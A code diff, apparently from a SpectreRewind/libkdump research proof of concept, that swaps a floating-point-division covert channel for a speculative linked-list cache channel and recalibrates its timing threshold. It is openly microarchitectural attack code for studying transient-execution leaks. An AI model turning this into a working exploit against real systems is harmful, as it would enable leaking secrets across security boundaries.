@@ -47,7 +47,7 @@
  * Public Types
  **************************************************************************/
 typedef struct {
-  size_t divsd_threshold; /**< threshold in cycles for the DIVSD channel */
+  size_t threshold; /**< threshold in cycles for the SPR covert channel */
 } libkdump_config_t;
   
 /**************************************************************************
@@ -59,6 +59,7 @@ static libkdump_config_t config;
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 static pthread_t count_thread;
 static int g_bp_depth = 9;
+static int g_list_acc = 12;
 
 /**************************************************************************
  * Public Function Prototypes
@@ -126,6 +127,7 @@ struct div_test
 {
   double number;
   double div;
+  int mul;
   volatile char *addr;
 };
 
@@ -145,37 +147,49 @@ struct div_test transmit;
  * all others    7
  * default       9 (works on all tested platforms)
  */ 
+
+// #include "random_data.h"
+unsigned int random_data[] = {
+     1,  2,  3,  4,  5,  6,  7,  8,  9, 10,
+    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+    21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
+    31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
+    41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
+    51, 52, 53, 54, 55, 56, 57, 58, 59, 60,
+    61, 62, 63, 64, 65, 66, 67, 68, 69, 70,
+    71, 72, 73, 74, 75, 76, 77, 78, 79, 80,
+    81, 82, 83, 84, 85, 86, 87, 88, 89, 90,
+    91, 92, 93, 94, 95, 0,
+};
+
 struct div_test *test_tasks[20];
 
-int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
-{
-  double recv_num = dt->number;
-  double div = dt->div;
-  double send1, send2, send3, send4;
-  volatile char *ptr = dt->addr;
+volatile char my_out[16];
+// linked: 96 * 4K = 384K > L2 cache (256KB)
+volatile int linked[96][1024] __attribute__ ((aligned (4096)));
 
-  send1 = my_number1;
-  send2 = my_number2;
-  send3 = my_number3;
-  send4 = my_number4;
+int start = 0;
+
+void __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
+{
+  volatile char *ptr = dt->addr;
+  int my_mul = dt->mul;
   
-  // receiver: control the speculation window size
-  for (int i = 0; i < N_DIVS; i++) {
-    recv_num /= div;
-    // recv_num += 0;
+  int next = start;
+  for (int i = 0; i < g_list_acc; i++) {
+    next = linked[next][256];
   }
-  if (recv_num == 1.0) { // trained true, but false when sending
-    if ( *ptr & (1 << bit_no) ) { // trained false, but true when sending
-      for (int x = 0; x < 100; x++) { // generate lots of contention
-        send1 /= div;
-        send2 /= div;
-        send3 /= div;
-        send4 /= div;
+  
+  if( 0 != (next * my_mul) ) {
+    if ( *ptr & (1 << bit_no) ) {
+      int next2 = start;
+      for (int i = 0; i < g_list_acc; i++) {
+	my_out[i] = linked[next2][256]; //  prefetching
+	next2 = random_data[next2]; // random_data is in cache
       }
     }
   }
-  return recv_num + send1 + send2 + send3 + send4;
-
+  start = next;
 }
 
 #define MIN(a,b) ((a<b) ? a : b)
@@ -211,18 +225,24 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
   uint64_t start = 0, end = 0, dur = 0;
   uint64_t bw_start = 0, bw_end = 0;
   double overall = N_TESTS;
-  
-  trainer.div = 3;
-  trainer.number = 1;
-  for (int i = 0; i < N_DIVS; i++) trainer.number *= trainer.div;
+
+  int next = 0;
+  do
+  {
+    int current = next;
+    next = random_data[current];
+    linked[current][256] = next;
+  } while( next != 0 );
+
+  start = 0;
+
+  trainer.mul = 1;
   trainer.addr = &zero; // training 
 
-  transmit_0.number = 150;
-  transmit_0.div = 1;
+  transmit_0.mul = 0;
   transmit_0.addr = &zero;
   
-  transmit_1.number = 150;
-  transmit_1.div = 1;
+  transmit_1.mul = 0;
   transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
   
   int n_addr = (g_bp_depth + 1) * 2; //
@@ -261,20 +281,20 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
           total[i][N_TESTS*99/100], total[i][N_TESTS-1]);
   }
   
-  if (total[0][N_TESTS*99/100] < total[1][N_TESTS*1/100]) {
-    config.divsd_threshold = (total[0][N_TESTS*99/100] + total[1][N_TESTS*1/100])/2;
+  if (total[1][N_TESTS*99/100] < total[0][N_TESTS*1/100]) {
+    config.threshold = (total[1][N_TESTS*99/100] + total[0][N_TESTS*1/100])/2;
   } else {
-    config.divsd_threshold = (total[0][N_TESTS/2] + total[1][N_TESTS/2])/2;
+    config.threshold = (total[1][N_TESTS/2] + total[0][N_TESTS/2])/2;
   }
-  debug(SUCCESS, "spectrerewind: divsd ch threshold: %d cycles\n", config.divsd_threshold);
+  debug(SUCCESS, "spectrerewind: covert ch threshold: %d cycles\n", config.threshold);
 
   int err0_cnt = -1, err1_cnt = -1;
   for (int j = 0; j < N_TESTS; j++) {
-    if (err0_cnt == -1 && total[0][N_TESTS-j-1] <= config.divsd_threshold) {
+    if (err0_cnt == -1 && total[0][j] > config.threshold) {
       debug(INFO, "0 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
       err0_cnt = j;
     }
-    if (err1_cnt == -1 && total[1][j] > config.divsd_threshold) {
+    if (err1_cnt == -1 && total[1][N_TESTS-j-1] <= config.threshold) {
       debug(INFO, "1 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
       err1_cnt = j;
     }
@@ -296,14 +316,18 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
 int main(int argc, char *argv[])
 {
   int opt;
-  while ((opt = getopt(argc, argv, "b:")) != -1) {
+  while ((opt = getopt(argc, argv, "b:l:")) != -1) {
     switch(opt) {
     case 'b': /* # iterations need to mistrain the branch predictor */
       g_bp_depth = strtol(optarg, NULL, 0);
       break;
+    case 'l': /* # dependent list accesses */
+      g_list_acc = strtol(optarg, NULL, 0);
+      break;
     }
   }
   debug(INFO, "BP training depth: %d\n", g_bp_depth);
+  debug(INFO, "# list accesses: %d\n", g_list_acc);
   
   if (setpriority(PRIO_PROCESS, 0, -20) < 0) {
     debug(ERROR, "priority -20 failed\n");
